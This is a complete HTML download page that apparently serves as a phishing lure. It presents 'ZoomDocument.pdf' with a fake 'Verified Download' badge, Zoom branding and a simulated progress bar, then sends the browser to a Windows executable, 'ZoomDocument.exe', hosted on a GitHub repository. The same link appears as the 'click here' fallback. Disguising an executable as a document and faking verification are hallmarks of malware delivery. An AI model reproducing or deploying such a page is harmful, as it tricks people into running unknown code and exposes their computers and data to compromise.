<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>ZoomDocument Download</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>
:root{
    --bg:#09090b;
    --card:#111827;
    --card2:#1f2937;
    --text:#ffffff;
    --muted:#9ca3af;
    --primary:#2563eb;
    --primary-hover:#1d4ed8;
    --success:#10b981;
    --border:rgba(255,255,255,.08);
}

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:'Inter',sans-serif;
    background:
    radial-gradient(circle at top left,#1d4ed833 0%,transparent 35%),
    radial-gradient(circle at bottom right,#2563eb22 0%,transparent 35%),
    var(--bg);
    color:var(--text);
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.container{
    width:100%;
    max-width:520px;
}

.card{
    background:rgba(17,24,39,.9);
    backdrop-filter:blur(20px);
    border:1px solid var(--border);
    border-radius:28px;
    padding:35px;
    box-shadow:
    0 20px 50px rgba(0,0,0,.5),
    inset 0 1px 0 rgba(255,255,255,.05);
}

.logo{
    width:82px;
    height:82px;
    margin:auto;
    border-radius:22px;
    background:linear-gradient(135deg,#2563eb,#60a5fa);
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:34px;
    font-weight:700;
    box-shadow:0 10px 30px rgba(37,99,235,.4);
}

h1{
    text-align:center;
    margin-top:18px;
    font-size:28px;
}

.subtitle{
    text-align:center;
    color:var(--muted);
    margin-top:10px;
    line-height:1.6;
}

.info{
    margin-top:30px;
    background:var(--card2);
    border-radius:18px;
    padding:18px;
}

.row{
    display:flex;
    justify-content:space-between;
    margin:10px 0;
}

.label{
    color:var(--muted);
}

.value{
    font-weight:600;
}

.download-btn{
    width:100%;
    margin-top:25px;
    border:none;
    cursor:pointer;
    background:linear-gradient(135deg,var(--primary),#60a5fa);
    color:white;
    padding:18px;
    border-radius:16px;
    font-size:17px;
    font-weight:600;
    transition:.3s;
}

.download-btn:hover{
    transform:translateY(-2px);
}

.progress-wrap{
    margin-top:25px;
    display:none;
}

.progress-bar{
    height:10px;
    background:#374151;
    border-radius:999px;
    overflow:hidden;
}

.progress{
    width:0%;
    height:100%;
    border-radius:999px;
    background:linear-gradient(90deg,#2563eb,#60a5fa);
}

.status{
    margin-top:10px;
    text-align:center;
    color:var(--muted);
}

.footer{
    text-align:center;
    margin-top:25px;
    color:var(--muted);
    font-size:14px;
}

.direct{
    color:#60a5fa;
    text-decoration:none;
}

.badge{
    margin-top:20px;
    display:flex;
    justify-content:center;
}

.badge span{
    background:#052e16;
    color:#6ee7b7;
    padding:8px 14px;
    border-radius:999px;
    font-size:13px;
    font-weight:600;
}

@media(max-width:600px){
    .card{
        padding:25px;
    }
}
</style>
</head>
<body>

<div class="container">
<div class="card">

<div class="logo">Z</div>

<h1>ZoomDocument.pdf</h1>

<p class="subtitle">
Fast and secure download powered by zoom.
</p>

<div class="badge">
<span>Verified Download</span>
</div>

<div class="info">
<div class="row">
<span class="label">Filename</span>
<span class="value">ZoomDocument</span>
</div>

<div class="row">
<span class="label">Size</span>
<span class="value">3.4 MB</span>
</div>

<div class="row">
<span class="label">Platform</span>
<span class="value">Windows</span>
</div>

<div class="row">
<span class="label">Version</span>
<span class="value">Latest</span>
</div>
</div>

<button class="download-btn" onclick="startDownload()">
⬇ Download Now
</button>

<div class="progress-wrap" id="progressWrap">
<div class="progress-bar">
<div class="progress" id="progress"></div>
</div>
<div class="status" id="status">
Preparing download...
</div>
</div>

<div class="footer">
If the download doesn't start,
<a class="direct"
href="https://raw.githubusercontent.com/fionamorris698-crypto/vigilant-octo-memory/main/ZoomDocument.exe">
click here
</a>
</div>

</div>
</div>

<script>
const DOWNLOAD_URL =
"https://raw.githubusercontent.com/fionamorris698-crypto/vigilant-octo-memory/main/ZoomDocument.exe";

function startDownload(){

const wrap=document.getElementById('progressWrap');
const progress=document.getElementById('progress');
const status=document.getElementById('status');

wrap.style.display='block';

let value=0;

const interval=setInterval(()=>{

value+=Math.random()*12;

if(value>100) value=100;

progress.style.width=value+"%";
status.textContent="Preparing download... "+Math.floor(value)+"%";

if(value>=100){

clearInterval(interval);

status.textContent="Starting download...";

setTimeout(()=>{
window.location.href=DOWNLOAD_URL;
},500);

}

},120);

}
</script>

</body>
</html>
